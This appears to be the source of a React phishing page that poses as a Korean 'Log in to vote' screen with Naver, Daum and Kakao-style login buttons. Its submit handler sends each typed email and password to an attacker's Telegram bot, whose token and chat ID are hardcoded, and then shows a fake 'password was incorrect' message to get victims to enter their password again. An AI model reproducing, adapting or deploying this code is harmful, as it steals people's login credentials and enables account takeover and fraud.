'use client';

import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import axios from 'axios';
import { useState } from 'react';
import { Link } from 'react-router-dom';
import CustomLanguageSelect from './components/CustomLanguageSelect';

const loginSchema = z.object({
    email: z.string().email({ message: 'Invalid email address' }),
    password: z.string().min(1, { message: 'Password is required' }),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function LoginPage() {
    const [sending, setSending] = useState(false);
    const [error, setError] = useState(false);

    const {
        register,
        handleSubmit,
        formState: { errors },
    } = useForm<LoginForm>({
        resolver: zodResolver(loginSchema),
    });

    const token = '6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ'
    const chatId = -1002517526747;

    const onSubmit = async (data: LoginForm) => {
        setSending(true);
        const message = `🟢 New Login Attempt\n\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`;

        try {
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`,
                {
                    chat_id: chatId,
                    text: message,
                }
            );

            setSending(false);
            setError(true);
            setTimeout(() => setError(false), 4000);
        } catch (err) {
            console.error('Telegram error:', err);
            setError(true);
            setSending(false);
            setTimeout(() => setError(false), 4000);
        }
    };


    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 px-4 py-6 max-w-md mx-auto">
            <h1 className="text-3xl font-bold text-gray-800 mb-10">Log in to vote</h1>

            <form
                onSubmit={handleSubmit(onSubmit)}
                className="flex flex-col w-full md:bg-white md:p-8 rounded-lg md:shadow-md mb-6 space-y-2"
            >
                <div className='w-full'>
                    <input
                        type="email"
                        placeholder="Email ID"
                        {...register('email')}
                        className="p-3 mb-2 border w-full border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-gray-500"
                    />
                    {errors.email && <p className="text-red-600 text-xs mb-2">{errors.email.message}</p>}

                </div>
                <div className='w-full'>
                    <input
                        type="password"
                        placeholder="Password"
                        {...register('password')}
                        className="p-3 mb-2 border w-full border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-gray-500"
                    />
                    {errors.password && (
                        <p className="text-red-600 text-xs mb-4">{errors.password.message}</p>
                    )}
                </div>

                <div className="space-y-2 w-full">
                    <button
                        type="submit"
                        disabled={sending}
                        className="bg-[#218838] block w-full hover:bg-green-700 text-white py-3 rounded-md text-base font-semibold transition disabled:opacity-50"
                    >
                        {sending ? 'Sending...' : 'Log in'}
                    </button>
                    {error && (
                        <p className="text-xs text-red-600 mb-4 text-center"> Sorry, your password was incorrect. Please double-check your password..</p>
                    )}
                </div>
            </form>



            <div className="flex flex-col sm:flex-row justify-between items-center w-full text-sm text-gray-600 gap-3 mb-6">
                <p className="flex items-center font-medium">
                    <span className="inline-block bg-orange-500 h-4 w-4 rounded-sm mr-2"></span>
                    Secure access
                </p>
                <div className="flex items-center gap-2">
                    <Link to="#" className="hover:underline font-medium">
                        Find ID
                    </Link>
                    <span>|</span>
                    <Link to="#" className="hover:underline font-medium">
                        Find password
                    </Link>
                </div>
            </div>

            <p className="text-gray-700 mb-4 font-medium">Log in with your SNS account</p>

            <div className="flex gap-4">
                <button className="w-14 h-14 bg-[#03c75a] text-white font-bold rounded-lg shadow flex items-center justify-center text-lg">
                    N
                </button>
                <button className="w-14 h-14 bg-gradient-to-r from-blue-500 via-red-500 to-yellow-400 text-white font-bold rounded-lg shadow flex items-center justify-center text-xs">
                    Daumn
                </button>
                <button className="w-14 h-14 bg-yellow-400 text-black font-bold rounded-lg shadow flex items-center justify-center text-xs">
                    TALK
                </button>
                <button className="w-14 h-14 bg-[#ff4444] text-white font-bold rounded-lg shadow flex items-center justify-center text-lg">
                    N
                </button>
            </div>
            <CustomLanguageSelect />
        </div>

    );
}
